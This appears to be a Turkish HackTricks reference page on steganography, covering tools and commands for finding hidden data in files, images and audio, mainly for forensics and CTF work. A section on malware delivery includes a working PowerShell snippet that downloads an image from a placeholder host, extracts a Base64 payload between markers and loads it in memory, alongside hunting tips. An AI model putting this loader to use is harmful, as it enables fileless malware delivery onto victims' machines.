# Stego Hileleri

{{#include ../banners/hacktricks-training.md}}

## **Dosyalardan Veri Çıkarma**

### **Binwalk**

Gömülü gizli dosyaları ve verileri aramak için binary dosyaları tarayan bir araç. `apt` ile kurulur ve kaynağı [GitHub](https://github.com/ReFirmLabs/binwalk) üzerinde mevcuttur.
```bash
binwalk file # Displays the embedded data
binwalk -e file # Extracts the data
binwalk --dd ".*" file # Extracts all data
```
### **Foremost**

Dosyaları başlık ve sonlarına göre kurtarır, png görüntüler için kullanışlıdır. `apt` ile kurulur; kaynağı [GitHub](https://github.com/korczis/foremost) üzerindedir.
```bash
foremost -i file # Extracts data
```
### **Exiftool**

Dosya meta verilerini görüntülemeye yardımcı olur, [here](https://www.sno.phy.queensu.ca/~phil/exiftool/) adresinden ulaşılabilir.
```bash
exiftool file # Shows the metadata
```
### **Exiv2**

exiftool'a benzer; meta verileri görüntülemek için kullanılır. `apt` üzerinden kurulabilir, kaynak kodu [GitHub](https://github.com/Exiv2/exiv2) üzerinde bulunur ve bir [official website](http://www.exiv2.org/) vardır.
```bash
exiv2 file # Shows the metadata
```
### **Dosya**

İşlemekte olduğunuz dosya türünü belirleyin.

### **Strings**

Çıktıyı filtrelemek için çeşitli kodlama ayarlarını kullanarak dosyalardan okunabilir dizeleri çıkarır.
```bash
strings -n 6 file # Extracts strings with a minimum length of 6
strings -n 6 file | head -n 20 # First 20 strings
strings -n 6 file | tail -n 20 # Last 20 strings
strings -e s -n 6 file # 7bit strings
strings -e S -n 6 file # 8bit strings
strings -e l -n 6 file # 16bit strings (little-endian)
strings -e b -n 6 file # 16bit strings (big-endian)
strings -e L -n 6 file # 32bit strings (little-endian)
strings -e B -n 6 file # 32bit strings (big-endian)
```
### **Comparison (cmp)**

Çevrimiçi bulunan orijinal sürümüyle değiştirilmiş bir dosyayı karşılaştırmak için kullanışlıdır.
```bash
cmp original.jpg stego.jpg -b -l
```
## **Metin İçindeki Gizli Verileri Çıkarma**

### **Boşluklardaki Gizli Veriler**

Görünüşte boş alanlardaki görünmez karakterler bilgi gizleyebilir. Bu verileri çıkarmak için şu adresi ziyaret edin [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder].

## **Görüntülerden Veri Çıkarma**

### **GraphicMagick ile Görüntü Ayrıntılarını Belirleme**

[GraphicMagick](https://imagemagick.org/script/download.php) görüntü dosyası türlerini belirlemek ve olası bozulmaları tespit etmek için kullanılır. Bir görüntüyü incelemek için aşağıdaki komutu çalıştırın:
```bash
./magick identify -verbose stego.jpg
```
Hasarlı bir görüntüyü onarmayı denemek için bir metadata comment eklemek yardımcı olabilir:
```bash
./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
```
### **Steghide ile Veri Gizleme**

Steghide, `JPEG, BMP, WAV, and AU` dosyalarının içine veri gizlemeyi sağlar; şifrelenmiş veriyi ekleyip çıkarabilir. Kurulum `apt` ile basittir ve kaynak kodu [GitHub'da mevcuttur](https://github.com/StefanoDeVuono/steghide).

**Komutlar:**

- `steghide info file` bir dosyanın gizli veri içerip içermediğini gösterir.
- `steghide extract -sf file [--passphrase password]` gizli veriyi çıkarır, parola isteğe bağlıdır.

Web tabanlı çıkarma için [bu siteyi](https://futureboy.us/stegano/decinput.html) ziyaret edin.

**Bruteforce Attack with Stegcracker:**

- Steghide üzerinde parola kırma denemesi yapmak için aşağıdaki gibi [stegcracker](https://github.com/Paradoxis/StegCracker.git) kullanın:
```bash
stegcracker <file> [<wordlist>]
```
### **zsteg için PNG ve BMP Dosyaları**

zsteg, PNG ve BMP dosyalarındaki gizli verileri ortaya çıkarmada uzmanlaşır. Kurulum `gem install zsteg` ile yapılır, [source on GitHub](https://github.com/zed-0xff/zsteg).

**Komutlar:**

- `zsteg -a file` bir dosyada tüm tespit yöntemlerini uygular.
- `zsteg -E file` veri çıkarmak için bir payload belirtir.

### **StegoVeritas ve Stegsolve**

**stegoVeritas** metadata kontrolleri yapar, görüntü dönüşümleri uygular ve diğer özelliklerin yanı sıra LSB brute forcing uygular. Tüm seçenekler için `stegoveritas.py -h` kullanın ve tüm kontrolleri çalıştırmak için `stegoveritas.py stego.jpg` komutunu kullanın.

**Stegsolve** görüntüler içindeki gizli metinleri veya mesajları ortaya çıkarmak için çeşitli renk filtreleri uygular. Mevcut olduğu yer: [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve).

### **FFT ile Gizli İçerik Tespiti**

Fast Fourier Transform (FFT) teknikleri, görüntülerde gizlenmiş içeriği ortaya çıkarabilir. Yararlı kaynaklar şunlardır:

- [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
- [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)

### **Stegpy için Ses ve Görüntü Dosyaları**

Stegpy, PNG, BMP, GIF, WebP ve WAV gibi formatları destekleyerek görüntü ve ses dosyalarına bilgi gömülmesine izin verir. Mevcut olduğu yer: [GitHub](https://github.com/dhsdshdhk/stegpy).

### **Pngcheck ile PNG Dosya Analizi**

PNG dosyalarını analiz etmek veya gerçekliğini doğrulamak için şunu kullanın:
```bash
apt-get install pngcheck
pngcheck stego.png
```
### **Görüntü Analizi için Ek Araçlar**

Daha fazla inceleme için şu kaynakları ziyaret edebilirsiniz:

- [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
- [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
- [Outguess](https://github.com/resurrecting-open-source-projects/outguess)
- [OpenStego](https://www.openstego.com/)
- [DIIT](https://diit.sourceforge.net/)

## Marker-delimited Base64 payloads görüntülere gizlenmiş (malware delivery)

Commodity loaders giderek Base64-encoded payload'ları geçerli görüntülerin içinde düz metin olarak gizliyor (çoğunlukla GIF/PNG). Pixel-level LSB yerine, payload dosya metni/metadata'sına gömülen benzersiz başlangıç/bitiş marker string'leriyle sınırlandırılır. A PowerShell stager then:
- Görüntüyü HTTP(S) üzerinden indirir
- Marker string'lerini bulur (gözlemlenen örnekler: <<sudo_png>> … <<sudo_odt>>)
- İki marker arasındaki metni çıkarır ve Base64 çözerek baytlara çevirir
- .NET assembly'sini hafızada yükler ve bilinen bir entry method'u çağırır (disk'e herhangi bir dosya yazılmaz)

Minimal PowerShell carving/loading snippet
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
$s = $img.IndexOf($start); $e = $img.IndexOf($end)
if($s -ge 0 -and $e -gt $s){
$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes) | Out-Null
}
```
Notlar
- Bu, ATT&CK T1027.003 (steganography) kapsamında yer alır. Marker string'leri kampanyalar arasında değişir.
- Hunting: indirilen görüntüleri bilinen ayırıcılar için tara; `DownloadString`'i takiben `FromBase64String` kullanan `PowerShell` örneklerini işaretle.

Ayrıca phishing teslim örnekleri ve tam bellek içi çağrı akışına buradan bakın:

{{#ref}}
../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
{{#endref}}

## **Seslerden Veri Çıkarma**

**Audio steganography** ses dosyaları içinde bilgi gizlemek için benzersiz bir yöntem sunar. Gizli içeriği gömmek veya çıkarmak için farklı araçlar kullanılır.

### **Steghide (JPEG, BMP, WAV, AU)**

Steghide, JPEG, BMP, WAV ve AU dosyalarına veri gizlemek için tasarlanmış çok yönlü bir araçtır. Detailed instructions are provided in the [stego tricks documentation](stego-tricks.md#steghide).

### **Stegpy (PNG, BMP, GIF, WebP, WAV)**

Bu araç PNG, BMP, GIF, WebP ve WAV dahil çeşitli formatlarla uyumludur. Daha fazla bilgi için refer to [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav).

### **ffmpeg**

ffmpeg, ses dosyalarının bütünlüğünü değerlendirmek, ayrıntılı bilgi sağlamak ve herhangi bir tutarsızlığı tespit etmek için önemlidir.
```bash
ffmpeg -v info -i stego.mp3 -f null -
```
### **WavSteg (WAV)**

WavSteg, en düşük anlamlı bit (LSB) stratejisini kullanarak WAV dosyaları içinde veri gizleme ve çıkarma konusunda başarılıdır. [GitHub](https://github.com/ragibson/Steganography#WavSteg) üzerinde mevcuttur. Komutlar şunlardır:
```bash
python3 WavSteg.py -r -b 1 -s soundfile -o outputfile

python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
```
### **Deepsound**

Deepsound, ses dosyaları içinde AES-256 kullanarak bilgi şifreleme ve tespitine olanak tanır. [the official page](http://jpinsoft.net/deepsound/download.aspx) üzerinden indirilebilir.

### **Sonic Visualizer**

Ses dosyalarının görsel ve analitik incelemesi için paha biçilmez bir araç olan Sonic Visualizer, diğer yollarla tespit edilemeyen gizli öğeleri ortaya çıkarabilir. Daha fazla bilgi için [official website](https://www.sonicvisualiser.org/) adresini ziyaret edin.

### **DTMF Tones - Dial Tones**

Ses dosyalarında DTMF tonlarını tespit etmek, [this DTMF detector](https://unframework.github.io/dtmf-detect/) ve [DialABC](http://dialabc.com/sound/detect/index.html) gibi çevrimiçi araçlarla yapılabilir.

## **Diğer Teknikler**

### **Binary Length SQRT - QR Code**

Karekökü tam sayı olan ikili veri bir QR code olabilir. Bunu kontrol etmek için şu kod parçasını kullanın:
```python
import math
math.sqrt(2500) #50
```
İkili (binary) veriyi görüntüye dönüştürmek için [dcode](https://www.dcode.fr/binary-image)'a bakın. QR kodlarını okumak için [this online barcode reader](https://online-barcode-reader.inliteresearch.com/) kullanın.

### **Braille Çevirisi**

Braille'i çevirmek için, [Branah Braille Translator](https://www.branah.com/braille-translator) mükemmel bir kaynaktır.

## **Kaynaklar**

- [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
- [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)

{{#include ../banners/hacktricks-training.md}}
